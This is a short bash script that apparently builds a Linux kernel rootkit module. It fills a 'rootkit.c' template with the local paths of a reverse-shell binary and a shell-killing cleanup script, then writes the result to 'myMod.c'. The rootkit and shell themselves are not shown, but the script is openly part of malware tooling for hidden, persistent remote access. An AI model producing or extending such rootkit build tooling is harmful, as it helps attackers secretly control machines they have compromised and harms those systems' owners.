#!/bin/bash

KERN=$(uname -r)
IN="rootkit.c"
OUT="myMod.c"
BREAK="----------------------------"

#Templates to be replaced
WHERE=$(pwd)"/shells/reverse_shell"
WHERE2=$(pwd)"/scripts/kill_shell.sh"
ESC_SHELL=$(echo $WHERE | sed -e 's/\//\\\//g')
ESC_CLEAN=$(echo $WHERE2 | sed -e 's/\//\\\//g')
SHELL_TMP="SHELL_TEMPLATE"
CLEAN_TMP="CLEAN_TEMPLATE"
sed -e "s/$SHELL_TMP/$ESC_SHELL/g;s/$CLEAN_TMP/$ESC_CLEAN/g;" < $IN > $OUT